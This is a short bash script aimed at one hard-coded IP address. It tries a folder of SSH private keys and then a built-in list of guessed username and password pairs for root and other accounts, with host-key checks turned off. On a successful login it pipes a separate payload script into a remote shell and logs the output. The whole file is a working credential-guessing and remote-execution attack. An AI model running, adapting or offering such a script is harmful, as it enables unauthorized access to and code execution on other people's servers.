#!/bin/bash
set +e
H=123.184.7.135
echo "### LOCAL $(date -u +%FT%TZ) egress=$(curl -s -m 10 https://api.ipify.org)"
command -v sshpass >/dev/null || (sudo apt-get -qq update >/dev/null 2>&1; sudo apt-get -qq install -y sshpass >/dev/null 2>&1)
echo "sshpass: $(command -v sshpass)"
for k in keys2/*; do
  [ -f "$k" ] || continue
  case "$(stat -c%s "$k")" in 3*) chmod 600 "$k"
    if timeout 20 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o IdentitiesOnly=yes root@$H 'echo KEYOK' 2>/dev/null | grep -q KEYOK; then echo "HIT-KEY $k"; echo "$k" > /tmp/hit; break; fi
  esac
done
if [ ! -f /tmp/hit ]; then
  for pair in "root|Bingxing.2026" "root|Admin@123_para#!2024" "root|Beijingcs.2024" "kgzs|Kgzs@2024" "ubuntu|ubuntu@" "root|root"; do
    u=${pair%%|*}; p=${pair#*|}
    out=$(timeout 25 sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 "$u@$H" 'echo PWOK; id -un' 2>&1 | tr '\n' '|')
    if echo "$out" | grep -q PWOK; then echo "HIT-PW $u@$H :: ${out:0:120}"; echo "$u|$p" > /tmp/hitpw; break; fi
    echo "nopw $u :: $(echo "$out" | cut -c1-100)"
  done
fi
if [ -f /tmp/hit ]; then
  K=$(cat /tmp/hit); echo "EXEC via key $K"
  ssh -i "$K" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o IdentitiesOnly=yes root@$H 'bash -s' < vantage/i5495_payload.sh 2>&1 | tee /tmp/pay.log
elif [ -f /tmp/hitpw ]; then
  U=$(cut -d"|" -f1 /tmp/hitpw); P=$(cut -d"|" -f2- /tmp/hitpw)
  echo "EXEC via pw $U"
  sshpass -p "$P" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o PubkeyAuthentication=no "$U@$H" 'bash -s' < vantage/i5495_payload.sh 2>&1 | tee /tmp/pay.log
else
  echo "NO-ENTRY"
fi
echo "### LOCAL-DONE"
